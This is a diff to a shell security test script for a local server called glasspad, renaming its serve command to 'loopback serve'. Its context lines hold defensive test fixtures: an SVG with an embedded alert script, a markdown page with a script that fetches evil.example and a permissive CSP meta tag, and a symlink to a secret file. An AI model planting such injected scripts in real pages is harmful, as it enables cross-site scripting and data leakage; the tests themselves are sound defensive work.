@@ -37,9 +37,9 @@ fi
 ( cd "$SUITE_DIR" && npx --yes playwright install chromium >/dev/null 2>&1 || true )
 
 echo "==> Starting glasspad on 127.0.0.1:$PORT"
-pkill -f "target/debug/glasspad serve" 2>/dev/null || true
+pkill -f "target/debug/glasspad loopback serve" 2>/dev/null || true
 sleep 0.5
-./target/debug/glasspad serve --port "$PORT" >/tmp/glasspad-sec-test.log 2>&1 &
+./target/debug/glasspad loopback serve --port "$PORT" >/tmp/glasspad-sec-test.log 2>&1 &
 SERVER_PID=$!
 cleanup() { kill "$SERVER_PID" 2>/dev/null || true; rm -f "$GLASSPAD_PID_FILE" 2>/dev/null || true; rm -rf "$GLASSPAD_STATE_DIR" 2>/dev/null || true; }
 trap cleanup EXIT
@@ -85,9 +85,9 @@ printf 'console.log(1)' > "$WORK/myspace/assets/app.js"
 printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > "$WORK/myspace/assets/logo.svg"
 printf '{"x":1}' > "$WORK/myspace/assets/sub/data.json"
 
-pkill -f "target/debug/glasspad serve" 2>/dev/null || true
+pkill -f "target/debug/glasspad loopback serve" 2>/dev/null || true
 sleep 0.5
-./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/myspace" >/tmp/glasspad-space-test.log 2>&1 &
+./target/debug/glasspad loopback serve --port "$SPACE_PORT" "$WORK/myspace" >/tmp/glasspad-space-test.log 2>&1 &
 SPACE_PID=$!
 for _ in $(seq 1 40); do
   if curl -fsS "http://127.0.0.1:$SPACE_PORT/myspace/_c/index" >/dev/null 2>&1; then break; fi
@@ -448,9 +448,9 @@ printf '# The Guide\n\nBack [home](./index).\n' > "$WORK/mdspace/guide.md"
 # RESPONSE CSP is server-authoritative — the <meta> can only tighten, never widen.
 printf '# Danger\n\n<script>fetch("http://evil.example/x")</script>\n<meta http-equiv="Content-Security-Policy" content="default-src *; connect-src *">\n' > "$WORK/mdspace/evil.md"
 
-pkill -f "target/debug/glasspad serve" 2>/dev/null || true
+pkill -f "target/debug/glasspad loopback serve" 2>/dev/null || true
 sleep 0.5
-./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/mdspace" >/tmp/glasspad-md-test.log 2>&1 &
+./target/debug/glasspad loopback serve --port "$SPACE_PORT" "$WORK/mdspace" >/tmp/glasspad-md-test.log 2>&1 &
 MD_PID=$!
 for _ in $(seq 1 40); do
   if curl -fsS "http://127.0.0.1:$SPACE_PORT/mdspace/_c/index" >/dev/null 2>&1; then break; fi
@@ -496,7 +496,7 @@ sleep 0.3
 # can never expose a file outside the space.
 mkdir -p "$WORK/linkspace"
 ln -s "$WORK/secret.txt" "$WORK/linkspace/index.html"
-if ./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/linkspace" >/tmp/glasspad-link-test.log 2>&1; then
+if ./target/debug/glasspad loopback serve --port "$SPACE_PORT" "$WORK/linkspace" >/tmp/glasspad-link-test.log 2>&1; then
   scheck 1 "symlinked artifact refused at startup"
 else
   grep -qi "symlink" /tmp/glasspad-link-test.log; scheck $? "symlinked artifact refused with informative error"
@@ -504,7 +504,7 @@ fi
 
 # Reserved-name / collision: hard errors, refuse to start.
 mkdir -p "$WORK/reserved"; printf x > "$WORK/reserved/api.html"; printf x > "$WORK/reserved/index.html"
-if ./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/reserved" >/tmp/glasspad-reserved-test.log 2>&1; then
+if ./target/debug/glasspad loopback serve --port "$SPACE_PORT" "$WORK/reserved" >/tmp/glasspad-reserved-test.log 2>&1; then
   scheck 1 "reserved slug refused at startup"
 else
   grep -qi "reserved" /tmp/glasspad-reserved-test.log; scheck $? "reserved slug refused with informative error"
